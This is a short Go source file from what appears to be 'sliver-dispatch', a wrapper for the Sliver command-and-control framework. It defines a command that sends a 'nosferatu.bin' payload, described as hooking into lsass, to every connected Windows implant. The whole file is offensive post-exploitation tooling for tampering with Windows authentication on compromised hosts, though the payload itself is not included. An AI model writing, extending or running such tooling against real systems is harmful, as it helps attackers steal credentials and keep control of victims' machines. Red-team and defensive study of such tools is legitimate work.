package modules

import (
	"sliver-dispatch/client_cmds/dispatch"
	"sliver-dispatch/globals"
	"sliver-dispatch/utils"
	"strings"

	"github.com/spf13/cobra"
)

var Nosferatu = &cobra.Command{
	Use:   "nosfereatu [ /path/to/nosferatu.bin ]",
	Short: "Deploy nosferatu to hook into lsass",
	Args:  cobra.MinimumNArgs(1),
	Run: func(cmd *cobra.Command, args []string) {

		args = utils.SplitArguments(strings.Join(args, " "))
		for i, arg := range args {
			utils.Dprint("Arg %d: %s", i, arg)
		}
		help, _ := cmd.Flags().GetBool("help")
		if len(args) == 0 || help {
			cmd.Usage()
			return
		}
		if cmd.Parent().Name() == "run_all_windows" {
			dispatch.Nosferatu(globals.Rpc, args[0:]...)
		} else {
			utils.Eprint("Cannot run nosferatu on linux!")
		}
	},
}
